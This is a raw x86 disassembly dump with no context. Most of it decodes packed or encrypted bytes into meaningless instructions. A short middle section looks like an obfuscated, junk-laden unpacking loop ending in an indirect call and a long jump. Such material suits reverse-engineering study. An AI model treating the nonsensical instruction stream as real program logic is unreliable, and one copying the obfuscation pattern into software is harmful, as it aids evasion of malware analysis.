  40d8a5:	jp     0x40d8a4
  40d8a7:	mov    al,0xe3
  40d8a9:	out    0x77,al
  40d8ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8ac:	in     al,dx
  40d8ad:	push   ecx
  40d8ae:	push   ds
  40d8af:	add    DWORD PTR [edi+0x15],ebp
  40d8b2:	lods   al,BYTE PTR ds:[esi]
  40d8b3:	jne    0x40d89f
  40d8b5:	stos   BYTE PTR es:[edi],al
  40d8b6:	jp     0x40d8ab
  40d8b8:	inc    edx
  40d8b9:	(bad)  
  40d8ba:	jmp    0xebb3:0x72709b26
  40d8c1:	sub    DWORD PTR [edx-0x2],ebx
  40d8c4:	hlt    
  40d8c5:	fs pop edx
  40d8c7:	into   
  40d8c8:	(bad)  
  40d8c9:	into   
  40d8ca:	outs   dx,BYTE PTR ds:[esi]
  40d8cb:	adc    eax,0x4a6426b5
  40d8d0:	push   eax
  40d8d1:	xchg   ebp,eax
  40d8d2:	shr    DWORD PTR [edx-0x2db5ef6c],1
  40d8d8:	push   ds
  40d8d9:	shr    DWORD PTR [ebx+0x44],cl
  40d8dc:	mov    bh,0x83
  40d8de:	sahf   
  40d8df:	in     eax,dx
  40d8e0:	xchg   ecx,eax
  40d8e1:	in     eax,dx
  40d8e2:	sub    eax,0x7c664a65
  40d8e7:	aas    
  40d8e8:	adc    edi,DWORD PTR [edi]
  40d8ea:	outs   dx,BYTE PTR ds:[esi]
  40d8eb:	cld    
  40d8ec:	ss jg  0x40d87b
  40d8ef:	xchg   ebx,eax
  40d8f0:	data16 outs dx,BYTE PTR ds:[esi]
  40d8f2:	jne    0x40d881
  40d8f4:	fild   DWORD PTR [eax]
  40d8f6:	cmp    BYTE PTR [eax+0x42],0x4a
  40d8fa:	out    dx,eax
  40d8fb:	repnz bound ebx,QWORD PTR [edx-0x22]
  40d8ff:	jbe    0x40d8ec
  40d901:	(bad)  [edi-0x749ea36d]
  40d907:	ret    0xe0d1
  40d90a:	sbb    eax,0x68b99e64
  40d90f:	je     0x40d89c
  40d911:	int    0xbb
  40d913:	push   es
  40d914:	xchg   ecx,eax
  40d915:	into   
  40d916:	push   ds
  40d917:	sbb    BYTE PTR [ecx+0xe],al
  40d91a:	in     al,0xad
  40d91c:	shl    edi,0x65
  40d91f:	pop    edx
  40d920:	clc    
  40d921:	rcr    BYTE PTR [esi-0x7188d55],1
  40d927:	mov    ecx,0x330b41dd
  40d92c:	in     eax,dx
  40d92d:	adc    al,0xf5
  40d92f:	je     0x40d93f
  40d931:	fcom   QWORD PTR [edx]
  40d933:	mov    edi,0xf1873177
  40d938:	dec    eax
  40d939:	adc    al,0x63
  40d93b:	mov    dl,0x74
  40d93d:	in     eax,0x3
  40d93f:	mov    ds:0xe59864f2,al
  40d944:	inc    ebp
  40d945:	jns    0x40d8ed
  40d947:	xchg   ebp,eax
  40d948:	mov    ebp,0x355ec1b7
  40d94d:	xchg   esi,eax
  40d94e:	in     al,0xf3
  40d950:	mov    WORD PTR [ebx+eax*4+0x7c2718cf],cs
  40d957:	cmp    BYTE PTR ds:0x3019819a,bh
  40d95d:	daa    
  40d95e:	fiadd  WORD PTR [edi]
  40d960:	sti    
  40d961:	mov    al,0xba
  40d963:	arpl   bx,bp
  40d965:	jae    0x40d9e3
  40d967:	sub    bh,ah
  40d969:	stos   BYTE PTR es:[edi],al
  40d96a:	pop    edx
  40d96b:	mov    esp,0xc7acfb15
  40d970:	fdiv   st,st(7)
  40d972:	test   al,0xab
  40d974:	cmp    bh,BYTE PTR [edi-0x4f]
  40d977:	or     dl,BYTE PTR [ebx]
  40d979:	inc    ebx
  40d97a:	mov    ebx,0x97c97afd
  40d97f:	cmp    BYTE PTR [ebp+0x43f5dd84],dl
  40d985:	cmovs  eax,DWORD PTR [ecx-0x33]
  40d989:	scas   eax,DWORD PTR es:[edi]
  40d98a:	aaa    
  40d98b:	dec    esp
  40d98c:	outs   dx,BYTE PTR ds:[esi]
  40d98d:	dec    esp
  40d98e:	mov    al,ds:0x20959114
  40d993:	xchg   ebp,eax
  40d994:	add    eax,0xe53212d3
  40d999:	sahf   
  40d99a:	xchg   al,al
  40d99c:	stos   DWORD PTR es:[edi],eax
  40d99d:	(bad)  
  40d99e:	icebp  
  40d99f:	jns    0x40d95c
  40d9a1:	outs   dx,DWORD PTR ds:[esi]
  40d9a2:	add    BYTE PTR [edi-0x78794e9f],0xf4
  40d9a9:	test   DWORD PTR [ecx+0x2ee8f41c],edi
  40d9af:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40d9b1:	adc    eax,0x56e81632
  40d9b6:	inc    esi
  40d9b7:	dec    edi
  40d9b8:	pop    ebx
  40d9b9:	dec    ecx
  40d9ba:	(bad)  
  40d9bc:	test   DWORD PTR [ecx+eiz*8+0x6ed4d664],edi
  40d9c3:	add    BYTE PTR [edx],dl
  40d9c5:	cwde   
  40d9c6:	popa   
  40d9c7:	lahf   
  40d9c8:	test   BYTE PTR [ecx-0x663b9bda],0xa9
  40d9cf:	data16 xchg BYTE PTR [ecx-0x25],cl
  40d9d3:	fdivr  DWORD PTR [eax-0x36851aae]
  40d9d9:	fistp  WORD PTR [ebx]
  40d9db:	cdq    
  40d9dc:	(bad)  
  40d9dd:	and    eax,0x4eb78c20
  40d9e2:	jmp    0xd394:0x848ad898
  40d9e9:	dec    esi
  40d9ea:	jge    0x40da6a
  40d9ec:	icebp  
  40d9ed:	add    ebx,ecx
  40d9ef:	sbb    DWORD PTR [esi+ecx*4-0x59],edi
  40d9f3:	mov    bl,0xa1
  40d9f5:	add    dh,BYTE PTR [esi-0x19c2dbf8]
  40d9fb:	push   ecx
  40d9fc:	xchg   ebx,eax
  40d9fd:	fucomip st,st(4)
  40d9ff:	fisubr DWORD PTR [edi+ecx*8+0x16106483]
  40da06:	adc    ebp,ebx
  40da08:	loopne 0x40d994
  40da0a:	dec    ebx
  40da0b:	jb     0x40da78
  40da0d:	inc    ebx
  40da0e:	sbb    DWORD PTR ds:[edi],eax
  40da11:	push   ecx
  40da12:	test   DWORD PTR [eax],0xe0fa19f5
  40da18:	or     dl,cl
  40da1a:	sbb    ebx,DWORD PTR [edi-0x592444ad]
  40da20:	xchg   ecx,eax
  40da21:	lea    edi,ds:0xac122d66
  40da27:	mov    bh,0x8b
  40da29:	fisub  DWORD PTR [edx+0x640ef3a9]
  40da2f:	jl     0x40da48
  40da31:	fdiv   QWORD PTR [edx]
  40da33:	aad    0xfe
  40da35:	out    dx,al
  40da36:	jge    0x40da9b
  40da38:	pushw  ds
  40da3a:	enter  0xf62f,0x1d
  40da3e:	imul   ebp,DWORD PTR [bx-0x1b0a],0x1f
  40da44:	into   
  40da45:	fimul  DWORD PTR [edi+0x26]
  40da48:	add    al,0x6f
  40da4a:	mov    bl,BYTE PTR ds:0xbdd1adbe
  40da50:	jg     0x40da93
  40da52:	inc    edi
  40da53:	sahf   
  40da54:	cld    
  40da55:	pmaxsw mm0,QWORD PTR [edi+0x56]
  40da59:	mov    bl,0x2e
  40da5b:	das    
  40da5c:	sub    eax,DWORD PTR [edi-0x1650bdb6]
  40da62:	adc    DWORD PTR [ecx+ebx*1-0x6e],eax
  40da66:	repz (bad) 
  40da69:	mov    eax,0x2bb5ea76
  40da6e:	bound  ebp,QWORD PTR ds:0x1fb5029
  40da74:	inc    ebx
  40da75:	xchg   esp,eax
  40da76:	xchg   ebp,eax
  40da77:	or     ebp,edx
  40da79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da7a:	jge    0x40da4e
  40da7c:	sub    al,0x1
  40da7e:	jecxz  0x40dafb
  40da80:	rcl    DWORD PTR [eax+eiz*8-0x53],cl
  40da84:	stc    
  40da85:	sbb    ebp,DWORD PTR [edx+0x66]
  40da88:	ss cmp esp,eax
  40da8b:	mov    esi,0x34742376
  40da90:	(bad)  
  40da91:	dec    ecx
  40da92:	push   esp
  40da93:	call   0x7310:0x3090fcd5
  40da9a:	mov    edi,0x6a4e27d1
  40da9f:	jmp    0x4193363b
  40daa4:	daa    
  40daa5:	shl    BYTE PTR [ebp+0x24fc4cd],0x2c
  40daac:	jecxz  0x40db18
  40daae:	mov    DWORD PTR [edx+0x38],ebx
  40dab1:	mov    WORD PTR [edi],ss
  40dab3:	and    BYTE PTR [ecx+edx*2+0x67],0x2
  40dab8:	mov    dl,0x0
  40daba:	ds sti 
  40dabc:	cmc    
  40dabd:	add    al,0x12
  40dabf:	cdq    
  40dac0:	pop    esi
  40dac1:	out    dx,al
  40dac2:	ret    
  40dac3:	test   al,0x3e
  40dac5:	lahf   
  40dac6:	push   esp
  40dac7:	jp     0x40dab0
  40dac9:	add    BYTE PTR [edx+0x53],al
  40dacc:	sub    DWORD PTR [ecx-0x52],edx
  40dacf:	pop    ss
  40dad0:	adc    al,0xd
  40dad2:	scas   al,BYTE PTR es:[edi]
  40dad3:	repnz shl cl,1
  40dad6:	push   cs
  40dad7:	dec    esi
  40dad8:	jb     0x40db21
  40dada:	out    dx,eax
  40dadb:	jge    0x40db46
  40dadd:	gs and eax,0x4797f64d
  40dae3:	call   0xadb9:0xe06de337
  40daea:	and    BYTE PTR [esi+0x1b50465b],bh
  40daf0:	stos   BYTE PTR es:[edi],al
  40daf1:	jl     0x40db27
  40daf3:	push   cs
  40daf4:	add    DWORD PTR [edx],edi
  40daf6:	push   esi
  40daf7:	sbb    al,0xfb
  40daf9:	xchg   esi,eax
  40dafa:	jecxz  0x40db73
  40dafc:	(bad)  
  40dafe:	call   FWORD PTR [esi+0x71]
  40db01:	jne    0x40dad3
  40db03:	scas   al,BYTE PTR es:[edi]
  40db04:	rol    dl,0x6d
  40db07:	jmp    DWORD PTR [esi]
  40db09:	pop    ecx
  40db0a:	mov    BYTE PTR [ebp-0x73],bh
  40db0d:	pop    ds
  40db0e:	popf   
  40db0f:	into   
  40db10:	dec    esi
  40db11:	sub    eax,0x2880b986
  40db16:	xor    ebx,edi
  40db18:	rol    BYTE PTR [eax],cl
  40db1a:	loope  0x40daf9
  40db1c:	mov    ds:0x8a202a27,eax
  40db21:	pop    esi
  40db22:	out    0x4c,al
  40db24:	dec    edx
  40db25:	xor    edi,eax
  40db27:	and    DWORD PTR [ebp+0xe],esp
  40db2a:	mov    al,0x36
  40db2c:	push   esp
  40db2d:	loop   0x40dad2
  40db2f:	jmp    DWORD PTR [ebx*2-0x1bfca235]
  40db36:	cmp    esp,edx
  40db38:	in     al,dx
  40db39:	pop    es
  40db3a:	add    ebp,DWORD PTR [esi+0x42]
  40db3d:	or     edx,DWORD PTR [esi+0x5]
  40db40:	mov    ebp,0x6e7f39f2
  40db45:	cmp    bh,al
  40db47:	jle    0x40db0c
  40db49:	mov    ecx,0x19476bf8
  40db4e:	jmp    0xfc39:0xb039c337
  40db55:	mov    DWORD PTR [ebx-0x578d5bd8],ecx
  40db5b:	push   esi
  40db5c:	xchg   ebp,eax
  40db5d:	cmc    
  40db5e:	(bad)  
  40db5f:	out    0xc7,al
  40db61:	fsubr  DWORD PTR [edx-0x27]
  40db64:	xchg   DWORD PTR [ecx],esp
  40db66:	jmp    0x40dbbd
  40db68:	xor    esi,edi
  40db6a:	jno    0x40dbb7
  40db6c:	std    
  40db6d:	or     ebp,DWORD PTR [eax+0xe]
  40db70:	pop    eax
  40db71:	mov    edx,0x1d4a0fec
  40db76:	cli    
  40db77:	xchg   ebx,eax
  40db78:	add    ch,BYTE PTR [ebx]
  40db7a:	push   esp
  40db7b:	adc    eax,edi
  40db7d:	adc    al,0xeb
  40db7f:	inc    ebx
  40db80:	mov    ecx,0x68092aa8
  40db85:	jae    0x40db19
  40db87:	pop    ecx
  40db88:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40db8a:	inc    ebx
  40db8b:	test   DWORD PTR [esi-0x7a7fea9e],eax
  40db91:	jae    0x40db9e
  40db93:	aas    
  40db94:	inc    esi
  40db95:	sub    DWORD PTR [ebp+ecx*8+0x6a50a167],0x3d36463
  40dba0:	cwde   
  40dba1:	stos   DWORD PTR es:[edi],eax
  40dba2:	test   eax,0xe4b80d5
  40dba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dba8:	out    0x8b,al
  40dbaa:	cmc    
  40dbab:	inc    esp
  40dbac:	ret    
  40dbad:	push   esi
  40dbae:	(bad)  
  40dbaf:	push   edi
  40dbb0:	scas   al,BYTE PTR es:[edi]
  40dbb1:	push   edx
  40dbb2:	dec    esi
  40dbb3:	test   BYTE PTR [esp+eax*4-0x10d40548],bh
  40dbba:	sbb    edx,DWORD PTR [edi-0x43]
  40dbbd:	ins    BYTE PTR es:[edi],dx
  40dbbe:	test   edi,edi
  40dbc0:	xor    bl,dl
  40dbc2:	mov    eax,ebp
  40dbc4:	push   eax
  40dbc5:	inc    edx
  40dbc6:	inc    esi
  40dbc7:	xor    cl,0xa2
  40dbca:	shr    BYTE PTR [esi+eax*1],cl
  40dbcd:	neg    BYTE PTR [ecx-0x2]
  40dbd0:	xor    eax,0x92d06b40
  40dbd5:	js     0x40dc51
  40dbd7:	leave  
  40dbd8:	cmp    al,al
  40dbda:	(bad)  
  40dbdc:	das    
  40dbdd:	inc    ebx
  40dbde:	cmp    ch,BYTE PTR [edx-0x5d]
  40dbe1:	jb     0x40db97
  40dbe3:	fmul   DWORD PTR [ecx-0x62]
  40dbe6:	adc    DWORD PTR es:[ecx],esi
  40dbe9:	cld    
  40dbea:	mov    esp,0x9dd84174
  40dbef:	addr16 mov eax,0x5562e9cd
  40dbf5:	loope  0x40dc3c
  40dbf7:	test   BYTE PTR [edx+eiz*2+0x5f],0xd0
  40dbfc:	inc    esi
  40dbfd:	aad    0x7c
  40dbff:	mov    es:0xd5698b6e,eax
  40dc05:	inc    edx
  40dc06:	rcl    BYTE PTR [ebp-0x18],0x82
  40dc0a:	adc    al,al
  40dc0c:	push   ss
  40dc0d:	nop
  40dc0e:	ss lock and eax,0x325d044d
  40dc15:	(bad)  
  40dc16:	mov    ebx,0xfd361337
  40dc1b:	dec    eax
  40dc1c:	add    DWORD PTR [edx+edi*4-0x46],ebp
  40dc20:	inc    ecx
  40dc21:	inc    eax
  40dc22:	(bad)  
  40dc23:	push   edx
  40dc24:	fstp   DWORD PTR [esi-0x2e6f731d]
  40dc2a:	aas    
  40dc2b:	lods   eax,DWORD PTR ds:[esi]
  40dc2c:	lea    ebp,[ebx]
  40dc2e:	add    dh,BYTE PTR [ecx+0x5c]
  40dc31:	shl    BYTE PTR [edx+0x67],0x4c
  40dc35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc36:	adc    BYTE PTR [ebx+0x3e9f272e],dl
  40dc3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc3d:	pop    ebp
  40dc3e:	mov    ecx,0xc9f23523
  40dc43:	cmp    bh,bl
  40dc45:	(bad)  
  40dc46:	cmp    DWORD PTR [edx+0x7f],esi
  40dc49:	jg     0x40dc6d
  40dc4b:	test   DWORD PTR [ecx+0x1dc771ed],esi
  40dc51:	sar    BYTE PTR [edx],1
  40dc53:	mov    ch,0x4f
  40dc55:	fadd   QWORD PTR [ebp-0x3387eeb]
  40dc5b:	inc    ebx
  40dc5c:	mov    eax,ds:0x82edabd5
  40dc61:	fidiv  WORD PTR [esi]
  40dc63:	je     0x40dc7e
  40dc65:	mov    al,0x2e
  40dc67:	sub    al,0x74
  40dc69:	jo     0x40dbfa
  40dc6b:	inc    ebp
  40dc6c:	dec    ebx
  40dc6d:	push   0xffffffa9
  40dc6f:	jnp    0x40dcd4
  40dc71:	pop    ebx
  40dc72:	mov    WORD PTR [ebx+eiz*8-0x36d10844],?
  40dc79:	push   ebx
  40dc7a:	jg     0x40dcaf
  40dc7c:	or     BYTE PTR [edi-0x25],0xa3
  40dc80:	pop    ss
  40dc81:	mov    edi,0x5ca61b21
  40dc86:	push   cs
  40dc87:	loope  0x40dcc8
  40dc89:	mov    edi,0x88fdf9c2
  40dc8e:	std    
  40dc8f:	in     al,0x49
  40dc91:	cmp    BYTE PTR [esi],ah
  40dc93:	cmc    
  40dc94:	mov    bh,0x1
  40dc96:	ror    BYTE PTR [ebx+0x49a3eee5],0x52
  40dc9d:	xchg   ebx,eax
  40dc9e:	xor    esp,DWORD PTR [ebx+0x43]
  40dca1:	sbb    BYTE PTR [esi-0x669a3d92],cl
  40dca7:	jmp    0x170bb31a
  40dcac:	pop    ecx
  40dcad:	(bad)  [edi]
  40dcaf:	pop    edx
  40dcb0:	add    DWORD PTR ds:0xa1804dbc,ebx
  40dcb6:	stos   BYTE PTR es:[edi],al
  40dcb7:	fld    TBYTE PTR [edi]
  40dcb9:	repz dec eax
  40dcbb:	int    0x69
  40dcbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcbe:	mov    ebp,0x367c433a
  40dcc3:	pop    ss
  40dcc4:	stos   DWORD PTR es:[edi],eax
  40dcc5:	cmp    ch,BYTE PTR [ebp+esi*4-0x7554559f]
  40dccc:	stos   DWORD PTR es:[edi],eax
  40dccd:	mov    edx,0xa222701b
  40dcd2:	cmp    eax,0xd95fcf7d
  40dcd7:	sbb    eax,0x530fd5b0
  40dcdc:	sub    DWORD PTR [ebx+ebx*2],esi
  40dcdf:	aaa    
  40dce0:	(bad)  
  40dce1:	aam    0x22
  40dce3:	int3   
  40dce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dce5:	xor    al,0x97
  40dce7:	test   al,0x55
  40dce9:	push   edi
  40dcea:	inc    ecx
  40dceb:	fimul  WORD PTR [esi+0x1dfe358a]
  40dcf1:	scas   al,BYTE PTR es:[edi]
  40dcf2:	jl     0x40dd65
  40dcf4:	mov    gs,edx
  40dcf6:	aaa    
  40dcf7:	cmp    eax,0xf12007f8
  40dcfc:	adc    cl,BYTE PTR [ebx-0x62]
  40dcff:	add    eax,0x673d08bb
  40dd04:	add    edi,DWORD PTR [edi+0x4063342d]
  40dd0a:	data16 adc al,0xaa
  40dd0d:	fs push eax
  40dd0f:	les    edi,FWORD PTR [eax]
  40dd11:	aaa    
  40dd12:	mov    ebp,0x44125f70
  40dd17:	mov    edi,DWORD PTR [esi+0x2073b2d9]
  40dd1d:	sbb    BYTE PTR [edi-0x3a],cl
  40dd20:	hlt    
  40dd21:	mov    ah,0x75
  40dd23:	xchg   esp,eax
  40dd24:	arpl   WORD PTR [edx+ecx*4+0x2759ff2e],si
  40dd2b:	push   cs
  40dd2c:	mov    edi,0x5a426627
  40dd31:	or     eax,0x95a08e3
  40dd36:	pop    edx
  40dd37:	inc    esi
  40dd38:	sbb    ecx,DWORD PTR [esi]
  40dd3a:	dec    ebp
  40dd3b:	ror    BYTE PTR [esp+edx*1-0x24],1
  40dd3f:	add    DWORD PTR [edi-0x4b],esi
  40dd42:	sub    eax,0xa19722
  40dd47:	jno    0x40dd7c
  40dd49:	loop   0x40ddb7
  40dd4b:	jecxz  0x40dd5a
  40dd4d:	popa   
  40dd4e:	out    0xb9,al
  40dd50:	or     DWORD PTR [ebx+0x2d],ebx
  40dd53:	ins    BYTE PTR es:[edi],dx
  40dd54:	pop    eax
  40dd55:	inc    esi
  40dd56:	add    BYTE PTR [ecx],dl
  40dd58:	popa   
  40dd59:	pushf  
  40dd5a:	dec    edi
  40dd5b:	xor    esp,0xd1016405
  40dd61:	lods   eax,DWORD PTR ds:[esi]
  40dd62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd63:	cmp    eax,0xa01c9aa8
  40dd68:	mov    ecx,0x896f95d0
  40dd6d:	ds arpl si,cx
  40dd70:	mov    eax,ds:0x4acee1ec
  40dd75:	and    esi,0xffffffa8
  40dd78:	scas   al,BYTE PTR es:[edi]
  40dd79:	pop    es
  40dd7a:	rol    BYTE PTR [esi+edx*4-0x2f],cl
  40dd7e:	jbe    0x40dd75
  40dd80:	mov    dl,0x59
  40dd82:	out    dx,al
  40dd83:	fcom   QWORD PTR [eax+0x5d1133cb]
  40dd89:	mov    cl,0x53
  40dd8b:	push   ebp
  40dd8c:	stc    
  40dd8d:	cmp    BYTE PTR ds:0xc8aa2331,bl
  40dd93:	cdq    
  40dd94:	das    
  40dd95:	mov    ebp,?
  40dd97:	popa   
  40dd98:	repnz (bad) 
  40dd9a:	ins    BYTE PTR es:[edi],dx
  40dd9b:	iret   
  40dd9c:	hlt    
  40dd9d:	out    dx,eax
  40dd9e:	mov    eax,0x14ef49ae
  40dda3:	mov    eax,0x8e9a725f
  40dda8:	dec    ebx
  40dda9:	and    DWORD PTR [edx-0x56],edx
  40ddac:	pop    ecx
  40ddad:	test   eax,0xd035ce76
  40ddb2:	in     al,dx
  40ddb3:	mul    DWORD PTR [eax]
  40ddb5:	add    DWORD PTR [edx],edi
  40ddb7:	cmc    
  40ddb8:	push   ebp
  40ddb9:	add    DWORD PTR [ebx],edi
  40ddbb:	xchg   ebp,eax
  40ddbc:	jo     0x40dd8f
  40ddbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddbf:	mov    eax,ds:0x2d6cab92
  40ddc4:	cmp    DWORD PTR [ebp+ebx*4-0x682e8354],edi
  40ddcb:	das    
  40ddcc:	xchg   ebp,eax
  40ddcd:	push   ecx
  40ddce:	(bad)  [ebx+0x67]
  40ddd1:	mov    ds:0x8b08510e,eax
  40ddd6:	jmp    0x40dd8b
  40ddd8:	pop    eax
  40ddd9:	(bad)  
  40ddda:	mov    WORD PTR [ebx+0x73],gs
  40dddd:	sub    al,BYTE PTR [eax+0x4f]
  40dde0:	adc    al,0x48
  40dde2:	push   edi
  40dde3:	ret    
  40dde4:	test   al,0x68
  40dde6:	in     al,dx
  40dde7:	cmp    BYTE PTR [edx],ch
  40dde9:	in     al,dx
  40ddea:	(bad)  [ebx-0x534127ab]
  40ddf0:	fxch   st(4)
  40ddf2:	sub    eax,0x4846f601
  40ddf7:	lea    eax,[eax]
  40ddf9:	jns    0x40dd88
  40ddfb:	jns    0x40ddde
  40ddfd:	or     ebx,DWORD PTR [ebx]
  40ddff:	sub    esi,ecx
  40de01:	pop    ds
  40de02:	loop   0x40de49
  40de04:	push   ebp
  40de05:	xchg   esp,eax
  40de06:	inc    edi
  40de07:	xchg   esp,eax
  40de08:	out    0x7c,al
  40de0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de0b:	lock (bad) [esi+0x279b8d5c]
  40de12:	mov    es,WORD PTR [eax]
  40de14:	jns    0x40de58
  40de16:	mov    esi,0x9eab9a86
  40de1b:	and    ch,cl
  40de1d:	cli    
  40de1e:	push   ebx
  40de1f:	pushf  
  40de20:	dec    eax
  40de21:	jb     0x40de7a
  40de23:	or     BYTE PTR [eax-0x3b],al
  40de26:	jnp    0x40de2b
  40de28:	scas   eax,DWORD PTR es:[edi]
  40de29:	jmp    0x40de0a
  40de2b:	cmp    eax,0xced0cbd5
  40de30:	mov    bl,0xf5
  40de32:	jae    0x40ddb6
  40de34:	retf   0x1b7a
  40de37:	jl     0x40dea8
  40de39:	retf   0x1755
  40de3c:	push   0x58
  40de3e:	or     eax,0x37e1339
  40de43:	addr16 jmp 0x5e198d97
  40de49:	add    bh,cl
  40de4b:	retf   
  40de4c:	das    
  40de4d:	sbb    BYTE PTR [edx-0x70],bl
  40de50:	mov    eax,DWORD PTR [ebp-0x4]
  40de53:	push   ebx
  40de54:	mov    DWORD PTR ds:0x42500c,0x32d4
  40de5e:	je     0x40deb5
  40de64:	or     DWORD PTR ds:0x427000,ecx
  40de6a:	mov    esi,DWORD PTR [ebp-0x18]
  40de6d:	mov    DWORD PTR ds:0x429000,0x1a4f
  40de77:	add    DWORD PTR [eax],esi
  40de79:	mov    eax,DWORD PTR [ebp-0x4]
  40de7c:	xor    esi,esi
  40de7e:	or     esi,DWORD PTR ds:0x428010
  40de84:	or     DWORD PTR ds:0x42600c,esi
  40de8a:	mov    esi,DWORD PTR [ebp+0xc]
  40de8d:	dec    DWORD PTR ds:0x428014
  40de93:	xor    esi,ecx
  40de95:	add    esi,edx
  40de97:	sub    DWORD PTR ds:0x426014,0x425028
  40dea1:	imul   esi,DWORD PTR [eax]
  40dea4:	mov    DWORD PTR ds:0x42701c,0x7c46
  40deae:	mov    DWORD PTR [eax],esi
  40deb0:	jmp    0x40dec4
  40deb5:	sub    DWORD PTR ds:0x427010,0x59d5
  40debf:	mov    esi,DWORD PTR [ebp+0x14]
  40dec2:	xor    DWORD PTR [eax],esi
  40dec4:	sub    esi,edi
  40dec6:	mov    eax,DWORD PTR [ebp-0x4]
  40dec9:	and    DWORD PTR ds:0x42801c,0x11ac
  40ded3:	mov    edi,DWORD PTR [ebp+0x10]
  40ded6:	add    ebx,esi
  40ded8:	xor    edi,ecx
  40deda:	or     DWORD PTR ds:0x429010,ebx
  40dee0:	mov    esi,0xffcd8d25
  40dee5:	dec    DWORD PTR ds:0x42801c
  40deeb:	mov    ebx,esi
  40deed:	sub    ebx,edi
  40deef:	add    DWORD PTR [eax],ebx
  40def1:	mov    DWORD PTR ds:0x425020,0x1c
  40defb:	cmp    DWORD PTR ds:0x425020,0x0
  40df02:	je     0x40df56
  40df08:	cmp    DWORD PTR ds:0x425020,0x9
  40df0f:	jne    0x40df28
  40df15:	push   DWORD PTR [ebp-0x28]
  40df18:	push   0x8d04
  40df1d:	push   0x4e0d
  40df22:	call   DWORD PTR ds:0x421020
  40df28:	cmp    DWORD PTR ds:0x425020,0xa
  40df2f:	jne    0x40df42
  40df35:	mov    edi,DWORD PTR ds:0x425020
  40df3b:	dec    edi
  40df3c:	mov    DWORD PTR ds:0x425020,edi
  40df42:	xor    edi,edi
  40df44:	xor    edi,DWORD PTR ds:0x425020
  40df4a:	dec    edi
  40df4b:	mov    DWORD PTR ds:0x425020,edi
  40df51:	jmp    0x40defb
  40df56:	mov    eax,DWORD PTR [ebp-0x4]
  40df59:	mov    edi,DWORD PTR [ebp-0x8]
  40df5c:	add    edi,DWORD PTR [eax]
  40df5e:	mov    DWORD PTR [ebp-0x8],edi
  40df61:	mov    eax,DWORD PTR [ebp+0xc]
  40df64:	mov    edi,DWORD PTR [ebp+0xc]
  40df67:	xor    edi,ecx
  40df69:	xor    eax,ecx
  40df6b:	lea    eax,[eax+edi*1+0x64e5b6]
  40df72:	mov    edi,DWORD PTR [ebp+0xc]
  40df75:	xor    edi,ecx
  40df77:	add    edi,edx
  40df79:	imul   eax,edi
  40df7c:	mov    edi,DWORD PTR [ebp+0xc]
  40df7f:	xor    edi,ecx
  40df81:	sub    edi,eax
  40df83:	mov    eax,DWORD PTR [ebp-0x4]
  40df86:	add    edi,edx
  40df88:	cmp    DWORD PTR [eax],edi
  40df8a:	mov    eax,DWORD PTR [ebp-0x4]
  40df8d:	mov    edi,DWORD PTR [ebp+0x10]
  40df90:	jg     0x40dfa3
  40df96:	xor    edi,ecx
  40df98:	mov    ebx,esi
  40df9a:	sub    ebx,edi
  40df9c:	add    DWORD PTR [eax],ebx
  40df9e:	jmp    0x40dfa9
  40dfa3:	xor    edi,ecx
  40dfa5:	add    edi,edx
  40dfa7:	add    DWORD PTR [eax],edi
  40dfa9:	mov    eax,DWORD PTR [ebp-0x8]
  40dfac:	mov    edi,DWORD PTR [ebp-0x10]
  40dfaf:	mov    eax,DWORD PTR [eax]
  40dfb1:	xor    edi,ecx
  40dfb3:	add    edi,0x3272da
  40dfb9:	not    edi
  40dfbb:	and    eax,edi
  40dfbd:	movsx  di,BYTE PTR [eax+0x1]
  40dfc2:	jmp    0x41036d
  40dfc7:	jge    0x40e029
  40dfc9:	xor    al,0x4e
  40dfcb:	xor    eax,DWORD PTR [esi]
  40dfcd:	add    ecx,DWORD PTR [edi-0x5e]
  40dfd0:	mov    dl,0x21
  40dfd2:	mov    al,0x70
  40dfd4:	push   esp
  40dfd5:	shl    BYTE PTR [ebx],cl
  40dfd7:	(bad)
  40dfda:	(bad)  
  40dfdb:	hlt    
  40dfdc:	pop    edi
  40dfdd:	bound  esp,QWORD PTR [edx+0x6]
  40dfe0:	sub    eax,DWORD PTR [ebx-0x77ecce91]
  40dfe6:	inc    ebx
  40dfe7:	xchg   cl,al
  40dfe9:	push   esp
  40dfea:	lods   eax,DWORD PTR ds:[esi]
  40dfeb:	inc    ecx
  40dfec:	call   0x798d2637
  40dff1:	fcom   DWORD PTR [ebx]
  40dff3:	mov    esp,0x35c78ad3
  40dff8:	sub    ch,dh
  40dffa:	imul   ecx,DWORD PTR [eax+0x48d7266e],0x9ae2fa69
  40e004:	aad    0x81
  40e006:	sahf   
  40e007:	(bad)  
  40e008:	inc    ebx
  40e009:	push   ss
  40e00a:	mov    edx,0x1c294bf6
  40e00f:	mov    ch,0x79
  40e011:	push   es
  40e012:	sub    eax,DWORD PTR [ebx+0x62]
  40e015:	xchg   DWORD PTR [esi],ecx
  40e017:	adc    al,0xd0
  40e019:	sub    al,0x16
  40e01b:	dec    eax
  40e01c:	clc    
  40e01d:	outs   dx,DWORD PTR ds:[esi]
  40e01e:	inc    ebx
  40e01f:	mov    dh,0xff
  40e021:	adc    ch,BYTE PTR [eiz*1+0x751ddaca]
  40e028:	sbb    bl,BYTE PTR [esi-0x6]
  40e02b:	jp     0x40e002
  40e02d:	ins    DWORD PTR es:[edi],dx
  40e02e:	add    al,0xe6
  40e030:	loop   0x40e013
  40e032:	jecxz  0x40e04d
  40e034:	sti    
  40e035:	cmp    BYTE PTR [eax-0x2dff7bee],0xb0
  40e03c:	xor    al,0x93
  40e03e:	call   0xdf6c:0xb5722997
  40e045:	arpl   WORD PTR [ebx],dx
  40e047:	pop    es
  40e048:	sub    eax,0x31b4181
  40e04d:	int3   
  40e04e:	stc    
  40e04f:	scas   al,BYTE PTR es:[edi]
